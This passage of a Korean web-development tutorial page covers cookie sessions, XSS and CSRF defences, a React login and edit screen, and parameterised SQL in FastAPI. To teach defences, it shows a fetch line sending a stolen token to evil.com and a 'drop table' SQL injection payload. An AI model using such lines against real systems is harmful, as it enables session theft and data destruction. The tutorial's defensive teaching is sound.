+<p>예를 들어 어떤 입력값에 <code>&lt;script&gt;...&lt;/script&gt;</code> 를 넣었는데 그게 그대로 화면에 출력되면, 그 스크립트가 <strong>다른 방문자의 브라우저에서 실행</strong>됩니다.</p>
+<p>그때 세션 정보가 자바스크립트로 읽히면 이렇게 털립니다.</p>
+<pre><code><span class="c">// localStorage 에 토큰을 넣었다면 — 한 줄이면 끝</span>
+fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
+
+<span class="c">// httpOnly 쿠키는 — 애초에 보이지 않는다</span>
+document.cookie    <span class="c">// 우리 세션 쿠키는 여기 안 나옴</span></code></pre>
+<p><strong><code>httpOnly</code> 는 "XSS 가 나더라도 세션만은 지킨다"는 마지막 방어선</strong>입니다.</p>
+<blockquote><p>React 는 화면에 넣는 값을 자동으로 이스케이프해서 XSS 를 기본적으로 막아줍니다. 다만 <code>dangerouslySetInnerHTML</code> 을 쓰면 그 보호가 풀립니다. 이름이 무섭게 지어진 이유예요.</p></blockquote>
+</div>
+</details>
+
+<details class="q">
+<summary><span class="q-ic">?</span>CSRF 가 뭔가요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p><strong>Cross-Site Request Forgery</strong> — 로그인된 상태를 악용해 <strong>내 이름으로 요청을 보내는</strong> 공격입니다.</p>
+<ol>
+  <li>내가 이력서 관리자에 로그인해 둠</li>
+  <li>악성 사이트에 들어감</li>
+  <li>그 사이트가 몰래 <code>내사이트/api/admin/profile</code> 에 요청을 보냄</li>
+  <li>브라우저가 <strong>쿠키를 자동으로 붙여</strong> 보냄 ← 자동 전송의 어두운 면</li>
+  <li>서버는 "로그인한 사람이네" 하고 처리</li>
+</ol>
+<p><code>SameSite=Lax</code> 는 <strong>다른 사이트에서 시작된 요청에는 쿠키를 안 붙입니다.</strong> 그래서 4번이 성립하지 않습니다.</p>
+<blockquote><p>쿠키의 "자동으로 붙는다"는 편리함이 곧 CSRF 의 원인이고, <code>SameSite</code> 가 그 부작용을 막는 장치입니다. <strong>편리함과 위험이 같은 뿌리에서 나옵니다.</strong></p></blockquote>
+</div>
+</details>
+
+<h3>4.4 <code>localStorage</code> 와 비교</h3>
+<div class="tw"><table>
+<thead><tr><th></th><th><code>httpOnly</code> 쿠키 (우리)</th><th>localStorage</th></tr></thead>
+<tbody>
+<tr><td>자바스크립트 접근</td><td>❌ 불가</td><td>✅ 가능</td></tr>
+<tr><td>XSS 발생 시</td><td>세션은 지켜짐</td><td><strong>한 줄로 탈취</strong></td></tr>
+<tr><td>요청에 붙이기</td><td>브라우저가 자동</td><td>매번 직접 헤더에</td></tr>
+<tr><td>CSRF 위험</td><td>있음 → <code>SameSite</code> 로 차단</td><td>없음 (자동 전송이 아니므로)</td></tr>
+<tr><td>새로고침 후</td><td>유지</td><td>유지</td></tr>
+</tbody>
+</table></div>
+<p><strong>둘 다 트레이드오프가 있습니다.</strong> 다만 XSS 는 어떤 사이트에서든 날 수 있는 반면 CSRF 는 <code>SameSite</code> 한 줄로 막히므로, <strong><code>httpOnly</code> 쿠키 + <code>SameSite</code></strong> 조합이 더 안전한 기본값입니다.</p>
+
+<h3>4.5 정정 — Preflight 는 일어나지 않았습니다</h3>
+<div class="box warn">
+  <p class="t">📌 Step 3 문서의 오류를 바로잡습니다</p>
+  <p>Step 3에서 <em>"Step 4에서 <code>PUT</code> 을 보내는 순간 Preflight 를 만나게 된다"</em> 고 썼는데 <strong>틀렸습니다.</strong></p>
+  <p>프록시 덕분에 브라우저 입장에서는 <code>PUT</code> 도 <strong>같은 출처(5173)</strong> 로 나갑니다. 같은 출처에는 CORS 검사 자체가 없으니 예비 요청도 없어요.</p>
+  <p>프록시 없이 8080 으로 직접 요청하는 구조였다면 지금 딱 만났을 문제입니다. <strong>프록시가 조용히 막아준 두 번째 문제</strong>였던 셈이고, Step 3 문서는 수정해뒀습니다.</p>
+</div>
+
+<h3>4.6 배포할 때 반드시 바꿀 것</h3>
+<pre class="diff" data-file="backend/main.py"><code>-    https_only=False,
++    https_only=True,</code></pre>
+<p><code>Secure</code> 없이 http 로 다니면 같은 와이파이에 있는 사람이 쪽지를 그대로 볼 수 있습니다.</p>
+
+<h2 id="s5">5. ② 로그인 화면</h2>
+
+<h3>5.1 라우터 설치</h3>
+<div class="cmd">
+  <div class="tabs">
+    <button class="tab" data-shell="cmd">cmd</button>
+    <button class="tab" data-shell="ps">PowerShell</button>
+    <button class="tab" data-shell="sh">macOS / Linux</button>
+  </div>
+  <pre data-shell="cmd"><code>npm i react-router</code></pre>
+  <pre data-shell="ps"><code>npm i react-router</code></pre>
+  <pre data-shell="sh"><code>npm i react-router</code></pre>
+</div>
+
+<h3>5.2 타입 재생성</h3>
+<p>백엔드에 주소 3개가 새로 생겼으니 반드시 필요합니다.</p>
+<div class="cmd">
+  <div class="tabs">
+    <button class="tab" data-shell="cmd">cmd</button>
+    <button class="tab" data-shell="ps">PowerShell</button>
+    <button class="tab" data-shell="sh">macOS / Linux</button>
+  </div>
+  <pre data-shell="cmd"><code>npm run gen:api</code></pre>
+  <pre data-shell="ps"><code>npm run gen:api</code></pre>
+  <pre data-shell="sh"><code>npm run gen:api</code></pre>
+</div>
+
+<details class="tb">
+<summary>
+  <span class="tb-lab">TROUBLESHOOTING</span>
+  <span class="tb-tit"><code>'/api/admin/auth/session' is not assignable to parameter of type ...</code></span>
+</summary>
+<div class="tb-body">
+<h4>증상</h4>
+<pre><code>Argument of type '"/api/admin/auth/session"' is not assignable to parameter
+of type '"/" | "/api/health" | "/api/profile"'</code></pre>
+<h4>원인</h4>
+<p>백엔드에는 그 주소가 있는데, <strong>프론트엔드의 타입이 아직 옛날 것</strong>입니다.</p>
+<h4>해결</h4>
+<pre><code>npm run gen:api</code></pre>
+<div class="box ok">
+  <p class="t">✅ 사실 좋은 신호입니다</p>
+  <p>이건 <strong>타입 검사가 제대로 동작한다는 증거</strong>이기도 합니다. 주소를 오타 냈을 때와 똑같은 방식으로 잡아준 거예요.</p>
+</div>
+</div>
+</details>
+
+<h3>5.3 화면은 하나, 부품으로 나눕니다</h3>
+<pre><code>frontend/src/
+├── api/
+│   ├── schema.d.ts      <span class="c">자동 생성</span>
+│   ├── types.ts         <span class="c">이름만 꺼냄</span>
+│   └── client.ts        <span class="c">백엔드 호출</span>
+├── components/          <span class="c">★ 새로 생김 — 편집 장치</span>
+│   ├── Editable.tsx     <span class="c">제자리 입력칸 (글꼴을 물려받는다)</span>
+│   ├── EditBar.tsx      <span class="c">위쪽 도구막대 (저장 · 되돌리기 · 로그아웃)</span>
+│   └── LoginPanel.tsx   <span class="c">푸터의 로그인 입구</span>
+├── routes/
+│   └── Cv.tsx           <span class="c">★ 읽기와 편집이 한 화면</span>
+├── App.tsx              <span class="c">주소 → 화면 연결</span>
+└── index.css</code></pre>
+
+<p><code>App.tsx</code> 는 아주 작습니다.</p>
+<pre data-file="frontend/src/App.tsx"><code>import { BrowserRouter, Navigate, Route, Routes } from 'react-router'
+import Cv from './routes/Cv'
+
+function App() {
+  return (
+    &lt;BrowserRouter&gt;
+      &lt;Routes&gt;
+        &lt;Route path="/" element={&lt;Cv /&gt;} /&gt;
+        <span class="c">{/* 예전 주소는 남겨두고 이력서로 보낸다 */}</span>
+        &lt;Route path="/admin" element={&lt;Navigate to="/" replace /&gt;} /&gt;
+      &lt;/Routes&gt;
+    &lt;/BrowserRouter&gt;
+  )
+}
+
+export default App</code></pre>
+
+<h4>읽기 모드와 편집 모드가 같은 상자를 씁니다</h4>
+<p>이게 "글자가 안 움직이는" 비결입니다.</p>
+<pre data-file="frontend/src/index.css"><code>.field,
+.editable {
+  display: block;
+  margin: -0.2em -0.45em;   <span class="c">/* 테두리와 여백만큼 바깥으로 당긴다 */</span>
+  padding: 0.2em 0.45em;
+  border: 1px dashed transparent;
+}</code></pre>
+<p>읽기용 <code>&lt;span class="field"&gt;</code> 와 편집용 <code>&lt;input class="editable"&gt;</code> 이 <strong>똑같은 크기의 상자</strong>를 쓰고, 그만큼 바깥으로 당겨 놓았습니다. 그래서 편집칸이 나타나도 글자가 제자리에 있습니다.</p>
+<div class="box ok">
+  <p class="t">✅ 핵심</p>
+  <p><strong>"안 움직이게 잘 맞춘 것"이 아니라, 원래 같은 상자라서 못 움직입니다.</strong></p>
+</div>
+<p>그리고 입력칸은 자기 글꼴을 정하지 않습니다.</p>
+<pre data-file="frontend/src/index.css"><code>.editable {
+  font: inherit;      <span class="c">/* 감싸는 태그에서 물려받는다 */</span>
+  color: inherit;
+}</code></pre>
+<p><code>&lt;h1&gt;</code> 안에 넣으면 제목처럼, 문단 안에 넣으면 본문처럼 보입니다.</p>
+
+<h3>5.4 화면 상태가 3갈래입니다</h3>
+<pre data-file="frontend/src/routes/Cv.tsx"><code>const [authenticated, setAuthenticated] = useState&lt;boolean | null&gt;(null)</code></pre>
+<div class="tw"><table>
+<thead><tr><th>값</th><th>화면</th></tr></thead>
+<tbody>
+<tr><td><code>null</code></td><td>"확인 중..." — 서버에 아직 안 물어봄</td></tr>
+<tr><td><code>false</code></td><td>로그인 폼</td></tr>
+<tr><td><code>true</code></td><td>편집 화면</td></tr>
+</tbody>
+</table></div>
+
+<details class="q">
+<summary><span class="q-ic">?</span><code>null</code> 을 빼고 <code>false</code> 로 시작하면 어떻게 되나요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p>새로고침할 때마다 <strong>로그인 폼이 잠깐 번쩍입니다.</strong> 이미 로그인돼 있는데도요.</p>
+<p>서버에 물어보기 전에는 <strong>"모른다"가 정답</strong>이고, 그걸 표현할 값이 필요합니다. <code>false</code> 는 "로그인 안 됨"이라는 <em>확정</em>이지 "모름"이 아니에요.</p>
+</div>
+</details>
+
+<h3>5.5 <code>event.preventDefault()</code></h3>
+<pre data-file="frontend/src/components/LoginPanel.tsx"><code>async function handleSubmit(event: FormEvent) {
+  event.preventDefault()</code></pre>
+<p>HTML 폼은 원래 제출하면 <strong>페이지를 통째로 새로고침</strong>합니다. 그 기본 동작을 막아야 자바스크립트로 처리할 수 있어요. 빼먹으면 화면이 깜빡이면서 입력이 날아갑니다.</p>
+
+<details class="tb">
+<summary>
+  <span class="tb-lab">TROUBLESHOOTING</span>
+  <span class="tb-tit">로그인은 되는데 새로고침하면 풀린다</span>
+</summary>
+<div class="tb-body">
+<h4>확인 1 — 시크릿/프라이빗 모드인가?</h4>
+<p>일부 브라우저는 창을 닫으면 쿠키를 지웁니다. 새로고침은 괜찮아야 하지만, 확장 프로그램이 개입할 수 있습니다.</p>
+<h4>확인 2 — 쿠키가 실제로 저장됐나?</h4>
+<p>F12 → <strong>Application → Cookies → <code>http://localhost:5173</code></strong> 에서 <code>myhub_session</code> 이 보이는지 확인하세요.</p>
+<h4>확인 3 — 주소가 왔다갔다 하지 않는가?</h4>
+<p><code>localhost:5173</code> 에서 로그인하고 <code>127.0.0.1:5173</code> 으로 들어가면 <strong>다른 사이트로 취급되어 쿠키가 안 갑니다.</strong> Step 3의 5.3에서 다룬 그 문제입니다. 하나로 통일하세요.</p>
+</div>
+</details>
+
+<h2 id="s6">6. ③ 수정 기능</h2>
+
+<h3>6.1 읽는 타입과 쓰는 타입은 다릅니다</h3>
+<pre data-file="backend/main.py"><code>class Profile(BaseModel):        <span class="c"># 읽기 — 서버가 내보내는 것</span>
+    id: int
+    full_name: str
+    headline: str
+    summary: str | None
+    updated_at: datetime
+
+
+class ProfileUpdate(BaseModel):  <span class="c"># 쓰기 — 클라이언트가 보내는 것</span>
+    full_name: str = Field(min_length=1, max_length=100)
+    headline: str = Field(min_length=1, max_length=200)
+    summary: str | None = Field(default=None, max_length=2000)</code></pre>
+
+<div class="box warn">
+  <p class="t">📌 <code>id</code> 와 <code>updated_at</code> 이 <code>ProfileUpdate</code> 에 없습니다</p>
+  <p>클라이언트가 정할 값이 아니니까요. 보낼 수 있게 두면 <code>updated_at</code> 을 조작하거나 <code>id</code> 를 바꿔 <strong>다른 행을 건드릴 수 있습니다.</strong></p>
+  <p>DTO 를 나눠서 <strong>"보낼 수 있는 것"을 애초에 제한</strong>한 겁니다.</p>
+</div>
+
+<p>이 구분은 그대로 TypeScript 타입으로 내려옵니다.</p>
+<pre data-file="frontend/src/api/types.ts"><code>export type Profile = ProfileResponse['profile']
+export type ProfileUpdate =
+  paths['/api/admin/profile']['put']['requestBody']['content']['application/json']</code></pre>
+
+<h3>6.2 SQL 인젝션 — 이번 단계에서 가장 중요합니다</h3>
+<pre data-file="backend/main.py"><code>cur.execute(
+    """
+    update public.profile
+       set full_name  = %(full_name)s,
+           headline   = %(headline)s,
+           summary    = %(summary)s,
+           updated_at = now()
+     where id = (select id from public.profile order by id limit 1)
+ returning id, full_name, headline, summary, updated_at
+    """,
+    body.model_dump(),
+)</code></pre>
+
+<p><code>%(full_name)s</code> 는 <strong>"여기에 값이 들어간다"는 자리 표시</strong>일 뿐입니다. 값은 SQL 문장과 <strong>별도로</strong> 전달돼요.</p>
+
+<div class="box danger">
+  <p class="t">🚨 문자열을 이어 붙였다면</p>
+  <pre><code><span class="c"># ❌ 절대 이렇게 하면 안 됩니다</span>
+f"update public.profile set full_name = '{name}'"</code></pre>
+  <p>누가 이름 칸에 이렇게 입력하면:</p>
+  <pre><code>'; drop table public.profile; --</code></pre>
+  <p>완성된 문장이 이렇게 됩니다.</p>
+  <pre><code>update public.profile set full_name = ''; drop table public.profile; --'</code></pre>
+  <p><strong>테이블이 통째로 사라집니다.</strong> 자리 표시를 쓰면 저 문자열은 그냥 "이상한 이름"으로 저장될 뿐, 명령으로 해석되지 않습니다.</p>
+</div>
+
+<blockquote><p>이건 프로그래밍에서 가장 오래되고 가장 흔한 보안 사고입니다. <strong>문자열을 이어 붙여서 SQL 을 만들지 않는다</strong> — 이 한 줄만 지키면 됩니다.</p></blockquote>
+
+<div class="box ok">
+  <p class="t">✅ 이 걱정은 Step 5 에서 구조적으로 사라집니다</p>
+  <p>SQLAlchemy ORM 을 도입하면 SQL 문을 우리가 쓰지 않습니다. 값은 항상 바인딩으로 전달되므로 <strong>실수로 문자열을 이어 붙일 방법 자체가 없어집니다.</strong></p>
+  <pre><code>entity.full_name = body.full_name   <span class="c"># UPDATE 문은 SQLAlchemy 가 만든다</span>
+db.commit()</code></pre>
+  <p>다만 <code>text()</code> 로 raw SQL 을 직접 쓸 때는 여전히 이 규칙이 적용됩니다. <strong>ORM 은 기본값을 안전하게 만들어줄 뿐, 면제권이 아닙니다.</strong></p>
+</div>
+
+<h3>6.3 <code>returning</code> — 쿼리 한 번으로 끝</h3>
+<pre><code>update ... set ..., updated_at = now()
+ where ...
+returning id, full_name, headline, summary, updated_at</code></pre>
+<p>수정하고 나서 다시 <code>select</code> 로 읽어올 필요가 없습니다. <strong>PostgreSQL 이 수정된 결과를 바로 돌려줍니다.</strong></p>
+<p>그래서 저장 직후 화면의 "마지막 수정" 시각이 정확히 갱신됩니다 — 서버가 <code>now()</code> 로 찍은 진짜 값이니까요.</p>
+
+<h3>6.4 검증을 두 번 합니다 (일부러)</h3>
+<pre data-file="backend/main.py"><code>full_name: str = Field(min_length=1, max_length=100)</code></pre>
+<pre data-file="frontend/src/routes/Cv.tsx"><code>&lt;Editable value={draft.full_name} maxLength={100} ... /&gt;</code></pre>
+<div class="tw"><table>
+<thead><tr><th></th><th>목적</th></tr></thead>
+<tbody>
+<tr><td><strong>브라우저</strong> (<code>maxLength</code>, <code>required</code>)</td><td>사용자 편의 — 즉시 알려주기</td></tr>
+<tr><td><strong>서버</strong> (<code>Field</code>)</td><td><strong>진짜 방어선</strong></td></tr>
+</tbody>
+</table></div>
+<p>브라우저 검증은 개발자도구로 <strong>1초면 우회됩니다.</strong> 그래서 서버 검증이 진짜고, 브라우저 검증은 친절함일 뿐입니다.</p>
+<p><strong>서버만 있어도 안전하고, 브라우저만 있으면 위험합니다.</strong></p>
+<p>Pydantic 이 거부하면 FastAPI 가 <strong>어느 항목이 왜 틀렸는지까지 담아 422 로</strong> 자동 응답합니다. 우리가 쓴 코드는 <code>Field(...)</code> 한 줄뿐이고요.</p>
+
+<h2 id="s7">7. ④ 정리</h2>
+
+<h3>7.1 세션이 만료되면 로그인 화면으로</h3>
+<div class="box danger">
+  <p class="t">🐛 고치기 전의 문제</p>
+  <p>12시간 뒤 저장을 누르면:</p>
+  <pre><code>빨간 글씨: "로그인이 필요합니다."
+그런데 화면은 편집 폼 그대로 → 몇 번을 눌러도 계속 실패</code></pre>
+</div>
+
+<p><strong>원인은 에러에 상태 코드가 없었다는 것</strong>입니다. 메시지 문자열만으로는 "401이면 로그인 화면으로" 같은 판단을 할 수 없습니다.</p>
+
+<pre data-file="frontend/src/api/client.ts"><code>export class ApiError extends Error {
+  status: number
+
+  constructor(message: string, status: number) {
+    super(message)
+    this.name = 'ApiError'
+    this.status = status
+  }
+}</code></pre>
+
+<pre data-file="frontend/src/routes/Cv.tsx"><code>function handleError(e: unknown) {
+  if (e instanceof ApiError &amp;&amp; e.status === 401) {
+    setAuthenticated(false)          <span class="c">// ← 로그인 화면으로 되돌림</span>
+    setError('세션이 만료되었습니다. 다시 로그인해 주세요.')
+    return
+  }
+  setError((e as Error).message)
+}</code></pre>
+
+<div class="box ok">
+  <p class="t">✅ 테스트 방법 — 12시간 기다릴 필요 없습니다</p>
+  <p>① 이력서 화면에서 로그인 후 <strong>F12 → Application → Cookies → <code>myhub_session</code> 삭제</strong><br>
+  ② 아무 글자나 고치고 저장 클릭<br>
+  ③ 읽기 모드로 돌아가며 "세션이 만료되었습니다" 표시</p>
+</div>
+
+<h3>7.2 <code>useEffect</code> 의 정리(cleanup) 함수</h3>
+<p>저장 알림이 3초 뒤 스스로 사라지게 했습니다.</p>
+<pre data-file="frontend/src/routes/Cv.tsx"><code>useEffect(() =&gt; {
+  if (!saved) return
+
+  const timer = setTimeout(() =&gt; setSaved(null), 3000)
+  return () =&gt; clearTimeout(timer)   <span class="c">// ← 정리</span>
+}, [saved])</code></pre>
+<p><strong><code>useEffect</code> 가 함수를 돌려주면 그게 정리용</strong>입니다. 다음에 이 효과가 다시 실행되기 직전이나, 화면이 사라질 때 호출됩니다.</p>
+<p>없으면 저장을 연달아 눌렀을 때 <strong>타이머가 여러 개 쌓여서</strong> 알림이 엉뚱한 타이밍에 사라집니다.</p>
+<blockquote><p>타이머, 이벤트 리스너, 구독처럼 <strong>"켜면 꺼야 하는 것"</strong> 은 전부 이 정리 함수에서 끕니다.</p></blockquote>
+
+<h3>7.3 상태관리 라이브러리는 아직 필요 없습니다</h3>
+<p>현재 API 호출 6개, 화면 2개.</p>
+<div class="tw"><table>
+<thead><tr><th>판단 기준</th><th>지금</th></tr></thead>
+<tbody>
+<tr><td>여러 화면이 같은 데이터를 공유하나?</td><td>❌ 각자 자기 것만</td></tr>
+<tr><td>저장 후 다른 화면을 갱신해야 하나?</td><td>❌ 공개 화면은 새 탭에서 새로고침</td></tr>
+<tr><td>같은 데이터를 반복해서 부르나?</td><td>❌ 화면당 1회</td></tr>
+</tbody>
+</table></div>
+<p><strong>셋 중 하나라도 ✅ 가 되면 그때 TanStack Query</strong> 를 넣습니다. Zustand 는 여전히 해당 없습니다 — 우리에게 부족한 건 <strong>서버 데이터 관리</strong>지 전역 변수가 아니거든요.</p>
+
+<h2 id="s8">8. 이번에 배운 개념</h2>
+<div class="tw"><table>
+<thead><tr><th>용어</th><th>한 줄 설명</th></tr></thead>
+<tbody>
+<tr><td><strong>쿠키</strong></td><td>서버가 브라우저에게 주는 쪽지. 브라우저가 자동 저장·자동 전송</td></tr>
+<tr><td><strong>세션</strong></td><td>"이 사람은 로그인했다"는 서버 쪽 기억. 우리는 서명된 쿠키에 담음</td></tr>
+<tr><td><strong><code>httpOnly</code></strong></td><td>자바스크립트가 쿠키를 못 읽게 함 → XSS 방어</td></tr>
+<tr><td><strong><code>SameSite=Lax</code></strong></td><td>다른 사이트발 요청에 쿠키를 안 붙임 → CSRF 방어</td></tr>
+<tr><td><strong><code>Secure</code></strong></td><td>HTTPS 에서만 쿠키 전송 (배포 시 필수)</td></tr>
+<tr><td><strong>XSS</strong></td><td>내 페이지에서 남의 자바스크립트가 실행되는 사고</td></tr>
+<tr><td><strong>CSRF</strong></td><td>로그인된 상태를 악용해 내 이름으로 요청을 보내는 공격</td></tr>
+<tr><td><strong>타이밍 공격</strong></td><td>비교에 걸리는 시간 차이로 비밀값을 알아내는 것</td></tr>
+<tr><td><strong>SQL 인젝션</strong></td><td>입력값이 SQL 명령으로 해석되는 사고. 자리 표시로 방어</td></tr>
+<tr><td><strong>파라미터 바인딩</strong></td><td><code>%(name)s</code> — 값을 SQL 문장과 분리해 전달하는 것</td></tr>
+<tr><td><strong><code>RETURNING</code></strong></td><td>수정·삭제한 행을 그 쿼리에서 바로 돌려받는 PostgreSQL 기능</td></tr>
+<tr><td><strong><code>Depends</code></strong></td><td>FastAPI 에서 "이 엔드포인트를 실행하기 전에 이걸 먼저" 지정</td></tr>
+<tr><td><strong>정리 함수 (cleanup)</strong></td><td><code>useEffect</code> 가 돌려주는 함수. 타이머·구독을 끄는 곳</td></tr>
+</tbody>
+</table></div>
+
+<h2 id="s9">9. 다음 단계 (Step 5)</h2>
+<div class="box ok">
+  <p class="t">🎯 다음 목표</p>
+  <p><strong>SQL 을 직접 쓰지 않고, 파이썬 클래스로 데이터베이스를 다룹니다.</strong></p>
+</div>
+<p>지금 백엔드에는 raw SQL 이 곳곳에 있습니다. <strong>SQLAlchemy ORM</strong> 을 도입해 전부 걷어냅니다.</p>
+<div class="tw"><table>
+<thead><tr><th></th><th>지금 (Step 4)</th><th>Step 5</th></tr></thead>
+<tbody>
+<tr><td>테이블 정의</td><td>SQL Editor 에서 <code>create table</code></td><td><strong>파이썬 클래스</strong> (엔티티)</td></tr>
+<tr><td>테이블 생성</td><td>손으로 SQL 실행</td><td><strong>서버 시작 시 자동</strong></td></tr>
+<tr><td>조회</td><td><code>cur.execute("select ...")</code></td><td><code>select(models.Profile)</code></td></tr>
+<tr><td>수정</td><td><code>update ... set ...</code></td><td><code>entity.full_name = "..."</code></td></tr>
+<tr><td><code>updated_at</code></td><td>UPDATE 문에 직접 적음</td><td>엔티티에 선언, 자동 갱신</td></tr>
+<tr><td>SQL 인젝션</td><td>자리 표시를 꼼꼼히 써야 함</td><td><strong>걱정거리 자체가 사라짐</strong></td></tr>
+</tbody>
+</table></div>
+<p><strong>6.2 에서 다룬 SQL 인젝션 위험이 구조적으로 해소되는 것</strong>이 특히 중요합니다. ORM 은 값을 항상 바인딩으로 넘기므로, 실수로 문자열을 이어 붙일 방법이 없습니다.</p>
+<p>파일 구조도 이렇게 나뉩니다.</p>
+<pre><code>backend/
+├── main.py       <span class="c">엔드포인트</span>
+├── db.py         <span class="c">엔진 · 세션 · Base</span>
+├── models.py     <span class="c">ORM 엔티티   (테이블의 모양)</span>
+├── schemas.py    <span class="c">Pydantic DTO (API 의 모양)</span>
+└── init_db.py    <span class="c">시작 시 테이블 자동 생성 + seed</span></code></pre>
+<p>지금까지 <code>models</code> 와 <code>schemas</code> 가 한 파일에 섞여 있었는데, <strong>원래 다른 개념</strong>이라 분리하면 훨씬 명확해집니다.</p>
+
+<div class="navlinks">
+  <a href="step3_react_frontend.html"><span class="k">← 이전</span><span class="v">Step 3 — 화면 붙이기 (React + TypeScript)</span></a>
+  <a href="step5_orm_sqlalchemy.html"><span class="k">다음 →</span><span class="v">Step 5 — ORM 도입 (SQLAlchemy)</span></a>
+</div>
+
+<p class="foot">MyHub 개발 기록 · Step 4 · 2026-07-28</p>
+
+</div>
+
+<script>
+(function(){
+  /* ── 0. diff 블록을 줄 단위로 다시 그린다 ── */
+  document.querySelectorAll('pre.diff > code').forEach(function(code){
+    var lines = code.textContent.replace(/\n+$/, '').split('\n');
+    code.textContent = '';
+    lines.forEach(function(line){
+      var head = line.charAt(0);
+      var div = document.createElement('div');
+      div.className = head === '+' ? 'add' : (head === '-' ? 'del' : 'ctx');
+      div.textContent = line.length ? line : ' ';
+      code.appendChild(div);
+    });
+  });
+
+  /* ── 0.5 코드 블록 위에 파일 경로를 표시한다 ── */
+  document.querySelectorAll('pre[data-file]').forEach(function(pre){
+    var lab = document.createElement('div');
+    lab.className = 'pre-file';
+    lab.textContent = pre.dataset.file;
+    pre.parentNode.insertBefore(lab, pre);
+    pre.classList.add('has-file');
+  });
+
+  /* ── 1. 코드 블록마다 복사 버튼 (diff 블록은 제외) ── */
+  function fallbackCopy(text, done){
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.setAttribute('readonly', '');
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); done(); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  document.querySelectorAll('pre:not(.diff)').forEach(function(pre){
+    var wrap = document.createElement('div');
+    wrap.className = 'pre-wrap';
+    pre.parentNode.insertBefore(wrap, pre);
+    wrap.appendChild(pre);
+
+    var btn = document.createElement('button');
+    btn.type = 'button';
+    btn.className = 'copy';
+    btn.textContent = '복사';
+    btn.addEventListener('click', function(){
+      var code = pre.querySelector('code');
+      var text = code ? code.innerText : pre.innerText;
+      var done = function(){
+        btn.textContent = '복사됨';
+        btn.classList.add('done');
+        setTimeout(function(){
+          btn.textContent = '복사';
+          btn.classList.remove('done');
+        }, 1500);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(done, function(){ fallbackCopy(text, done); });
+      } else {
+        fallbackCopy(text, done);
+      }
+    });
+    wrap.appendChild(btn);
+  });
+
+  /* ── 2. 터미널 탭 (문서 전체가 함께 전환된다) ── */
+  var DEFAULT = navigator.platform && /Mac|iPhone|iPad|Linux/.test(navigator.platform) ? 'sh' : 'cmd';
+
+  function apply(s){
+    document.querySelectorAll('.cmd').forEach(function(group){
+      var panes = group.querySelectorAll('pre[data-shell]');
+      if (!panes.length) return;
+      var has = false;
+      panes.forEach(function(p){ if(p.dataset.shell === s) has = true; });
+      var target = has ? s : panes[0].dataset.shell;
+      panes.forEach(function(p){
+        var box = p.closest('.pre-wrap') || p;
+        box.hidden = (p.dataset.shell !== target);
+      });
+      group.querySelectorAll('.tab').forEach(function(t){
+        t.classList.toggle('on', t.dataset.shell === target);
+      });
+    });
+  }
+
+  document.addEventListener('click', function(e){
+    var t = e.target.closest('.tab');
+    if(t) apply(t.dataset.shell);
+  });
+
+  apply(DEFAULT);
+})();
+</script>
+</body>
+</html>
